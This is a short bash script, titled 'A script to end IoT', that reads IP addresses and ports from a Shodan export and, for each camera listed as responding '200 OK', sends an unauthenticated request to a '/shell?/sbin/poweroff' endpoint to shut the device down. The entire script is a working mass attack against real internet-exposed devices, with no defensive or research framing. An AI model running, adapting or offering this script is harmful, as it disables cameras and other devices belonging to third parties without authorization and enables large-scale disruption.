#!/bin/bash

#A script to end IoT

COUNTER=0

grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' shodan_data.csv | grep "200 OK" | cut -d "," -f 1-2 | tr "," ":" | tail -n +400  | while read -r line ; do
    echo "processing cam #$COUNTER : $line"
    echo $(curl -s --connect-timeout 1 --max-time 1 "http://$line/shell?/sbin/poweroff")
    let COUNTER=COUNTER+1
done
